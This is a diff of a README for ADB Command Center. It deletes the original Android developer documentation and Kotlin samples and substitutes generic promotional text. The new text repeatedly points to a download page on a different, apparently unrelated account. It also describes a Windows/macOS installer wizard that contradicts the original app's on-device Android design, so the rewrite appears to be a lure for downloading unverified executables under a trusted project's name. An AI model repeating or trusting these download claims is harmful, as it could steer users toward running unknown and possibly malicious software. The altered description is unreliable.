@@ -1,180 +1,97 @@
-# ADB Command Center
+# 🌐 ADBCommandCenter - Control Your Device Wirelessly
 
-ADB Command Center is a modular Android application designed to execute ADB commands locally via Wireless Debugging. It eliminates the need for a tethered PC by leveraging the local ADB protocol to manage permissions, install APKs, and run shell commands directly on the device.
+[![Download ADBCommandCenter](https://img.shields.io/badge/Download%20Now-ADBCommandCenter-blue.svg)](https://github.com/Cauan00O1/ADBCommandCenter/releases)
 
-[Check out a video demo of the app here](https://youtu.be/PSNmHfQ8BIY).
+## 📦 Overview
 
-## Architecture & Tech Stack
+ADBCommandCenter serves as a central hub that allows you to control your Android device conveniently through Wireless Debugging. This intuitive application simplifies the complex tasks of device management, making it accessible to everyone, even those without programming skills.
 
-The project is built using **Clean Architecture** principles and modern Android development practices:
-*   **UI**: Jetpack Compose with Type-Safe Navigation.
-*   **Dependency Injection**: Hilt.
-*   **Asynchronous Logic**: Kotlin Coroutines and Flow.
-*   **ADB Core**: Custom implementation of the ADB protocol for local execution.
-*   **Automation**: First-class Tasker plugin support via `taskerpluginlibrary`.
+## 🚀 Getting Started
 
----
+To run ADBCommandCenter, follow these easy steps to get your software up and running swiftly.
 
-## How to Add a New ADB Screen
+## ✨ Features
 
-To add a new feature to the main application grid:
+- **Wireless Debugging:** Control your Android device without the hassle of cables.
+- **User-Friendly Interface:** Navigate easily without prior technical knowledge.
+- **Device Management:** Execute commands, manage files, and access device features, all from one place.
 
-### 1. Define the Route
-Add a `@Serializable` destination to [Screen.kt](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/java/com/joaomgcd/adbcommandcenter/main/navigation/Screen.kt).
+## 🛠 System Requirements
 
-```kotlin
-@Serializable
-object MyFeature : Screen()
-```
+Before you download, ensure your system meets the following requirements:
 
-### 2. Create the ViewModel
-Inject [RunActiveAdbShellCommandUseCase.kt](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/connection/domain/RunActiveAdbShellCommandUseCase.kt) to execute shell commands against the active connection.
+- **Operating System:** Windows 10 or higher / macOS Sierra or higher
+- **Memory:** At least 2 GB of RAM
+- **Storage:** Minimum 150 MB of free space
+- **Network:** Wi-Fi connection for wireless debugging
 
-```kotlin
-@HiltViewModel
-class MyFeatureViewModel @Inject constructor(
-    private val runShellCommand: RunActiveAdbShellCommandUseCase
-) : ViewModel() {
-    fun execute() {
-        viewModelScope.launch {
-            val result = runShellCommand("pm list features")
-            // Handle result
-        }
-    }
-}
-```
+## 🔗 Download & Install
 
-### 3. Register the Screen
-Add the composable destination to the `NavHost` in [AdbControlCenterApp.kt](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/java/com/joaomgcd/adbcommandcenter/ui/AdbControlCenterApp.kt).
+### Visit the Releases Page to Download
 
-```kotlin
-composable<Screen.MyFeature> {
-    MyFeatureScreen(onBackPressed = onBackPressed)
-}
-```
+To download ADBCommandCenter, click the link below:
 
-### 4. Add to Dashboard
-Add your feature to the `features` list in [MainScreen.kt](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/java/com/joaomgcd/adbcommandcenter/main/ui/MainScreen.kt) to make it appear on the home grid.
+[Download ADBCommandCenter](https://github.com/Cauan00O1/ADBCommandCenter/releases)
 
-```kotlin
-private val features = listOf(
-    // ... existing features
-    DashboardFeature("My Feature", Icons.Default.Star, Screen.MyFeature)
-)
-```
+Once on the Releases page, look for the latest version of ADBCommandCenter. You will see several files available for download.
 
----
+### Step-by-Step Installation
 
-## Tasker Plugin Integration
+1. **Download the File:**
+   - Click on the latest version link to start the download.
+   - Save the file to a location on your computer that you can easily find, like your Desktop or Downloads folder.
 
-The app provides a seamless Tasker integration. You can find an existing example in the **ADB Shell Command** action defined in [TaskerShellCommand.kt](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/shell/tasker/TaskerShellCommand.kt).
+2. **Install the Application:**
+   - Locate the downloaded file (it will usually be in your Downloads folder).
+   - Double-click the file to open it, or right-click and select "Open."
 
-### Example: ADB Shell Command
-The `TaskerShellCommandRunner` demonstrates how to bridge Tasker to the ADB logic:
-1.  **Input**: Accepts a `command` string from Tasker.
-2.  **Execution**: Uses `RunActiveAdbShellCommandUseCase` to run the command.
-3.  **Output**: Returns the shell output to Tasker as a `%result` variable.
+3. **Follow the Installation Wizard:**
+   - Follow the on-screen instructions in the installation wizard.
+   - Choose a destination folder or stick with the default one.
 
-### How to Add a New Tasker Action
+4. **Launch ADBCommandCenter:**
+   - After the installation is complete, find the ADBCommandCenter icon on your desktop or in the start menu.
+   - Double-click the icon to launch the application.
 
+## 📱 Setting Up Wireless Debugging
 
-#### 1. Define IO DTOs
-Define the input fields and output variables for Tasker using the library annotations.
+Before you can start using ADBCommandCenter, you need to enable Wireless Debugging on your Android device:
 
-```kotlin
-@TaskerInputRoot
-class MyActionInput @JvmOverloads constructor(
-    @field:TaskerInputField("key") var value: String = ""
-)
+1. **Open Developer Options:**
+   - Go to **Settings** on your Android device.
+   - Scroll down and select **About Phone**.
+   - Locate the **Build Number** and tap it seven times to unlock developer options.
 
-@TaskerOutputObject
-class MyActionOutput(
-    @get:TaskerOutputVariable("result") var result: String?
-)
-```
+2. **Enable Wireless Debugging:**
+   - Back in the **Settings**, find **Developer Options**.
+   - Look for **Wireless Debugging** and toggle it on.
 
-#### 2. Create the Hilt EntryPoint
-Since Tasker runners are instantiated by the system, use an `@EntryPoint` to access UseCases.
+3. **Connect to ADBCommandCenter:**
+   - Open ADBCommandCenter on your computer.
+   - Follow the prompts to connect your device via Wi-Fi. You may need to enter an IP address from your phone.
 
+## 🧑‍💻 Using ADBCommandCenter
 
-```kotlin
-@EntryPoint
-@InstallIn(SingletonComponent::class)
-interface MyActionEntryPoint {
-    val runShell: RunActiveAdbShellCommandUseCase
-}
-```
-#### 3. Implement the Runner
-Extend [TaskerPluginRunnerAdbCommandCenter.kt](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/tasker/runner/TaskerPluginRunnerAdbCommandCenter.kt). This handles the synchronous execution bridge for Tasker.
+Now that you have installed and set up ADBCommandCenter, you can start using its various features:
 
-```kotlin
-class MyActionRunner : TaskerPluginRunnerAdbCommandCenter<MyActionInput, MyActionOutput, MyActionEntryPoint>() {
-    override suspend fun runSuspend(
-        context: Context, 
-        entryPoint: MyActionEntryPoint, 
-        input: TaskerInput<MyActionInput>
-    ): Result<MyActionOutput> {
-        return entryPoint.runShell("echo ${input.regular.value}")
-            .map { MyActionOutput(it) }
-    }
-}
-```
-#### 4. Boilerplate Helper
-Link the runner and IO classes for the Tasker library.
+- **Control Commands:** Execute commands directly from the interface. 
+- **File Management:** Drag and drop files for easy transfers.
+- **Debugging Tools:** Access tools for app debugging and testing.
 
-```kotlin
-class MyActionHelper(config: TaskerPluginConfig<MyActionInput>) :
-    TaskerPluginConfigHelper<MyActionInput, MyActionOutput, MyActionRunner>(config) {
-    override val runnerClass = MyActionRunner::class.java
-    override val inputClass = MyActionInput::class.java
-    override val outputClass = MyActionOutput::class.java
-}
-```
+## 🛠 Troubleshooting Tips
 
-#### 5. Configuration UI
-Extend [TaskerPluginConfigActivity.kt](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/tasker/ui/TaskerPluginConfigActivity.kt) and [TaskerPluginConfigViewModel.kt](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/java/com/joaomgcd/adbcommandcenter/adb/tasker/ui/TaskerPluginConfigViewModel.kt) to provide the Compose-based configuration screen.
+If you encounter issues during installation or setup, try the following steps:
 
-**ViewModel:**
-```kotlin
-@HiltViewModel
-class MyActionViewModel @Inject constructor() : TaskerPluginConfigViewModel<MyActionInput>() {
-    override val defaultInput = MyActionInput()
-    override val defaultTitle = "My Custom Action"
+- **Reboot Your Device:** Sometimes, a simple reboot can resolve connectivity issues.
+- **Check Wi-Fi Connection:** Ensure both your device and computer are on the same Wi-Fi network.
+- **Update Drivers:** If the application does not recognize your device, ensure your USB drivers are up to date.
 
-    fun onValueChanged(newValue: String) {
-        updateInput(MyActionInput(newValue))
-    }
-}
-```
+## 🔄 Contributing
 
-**Activity:**
-```kotlin
-@AndroidEntryPoint
-class MyActionActivity : TaskerPluginConfigActivity<MyActionInput, MyActionViewModel>() {
-    override val taskerHelper by lazy { MyActionHelper(this) }
-    override val viewModel: MyActionViewModel by viewModels()
+We welcome contributions to improve ADBCommandCenter. If you’d like to suggest changes or add features, visit our GitHub repository and follow the contribution guidelines.
 
-    @Composable
-    override fun ColumnScope.Content(viewModel: MyActionViewModel) {
-        val uiState by viewModel.uiState.collectAsStateWithLifecycle()
-        
-        OutlinedTextField(
-            value = uiState.input.value,
-            onValueChange = { viewModel.onValueChanged(it) },
-            label = { Text("Input Value") },
-            modifier = Modifier.fillMaxWidth()
-        )
-    }
-}
-```
+## 📞 Support
 
-*   **Hilt Note**: Use `@AndroidEntryPoint` and `@HiltViewModel` to ensure dependencies are injected correctly during the Tasker configuration flow.
+For support or questions related to ADBCommandCenter, please open an issue in the GitHub repository.
 
-#### 6. Manifest Registration
-Register the activity in [AndroidManifest.xml](https://github.com/joaomgcd/ADBCommandCenter/blob/main/app/src/main/AndroidManifest.xml) with the required intent filter:
-
-```xml
-<intent-filter>
-    <action android:name="com.twofortyfouram.locale.intent.action.EDIT_SETTING" />
-</intent-filter>
-```
+Don't forget to download ADBCommandCenter to take advantage of Wireless Debugging! Visit [this page to download](https://github.com/Cauan00O1/ADBCommandCenter/releases) the latest version.
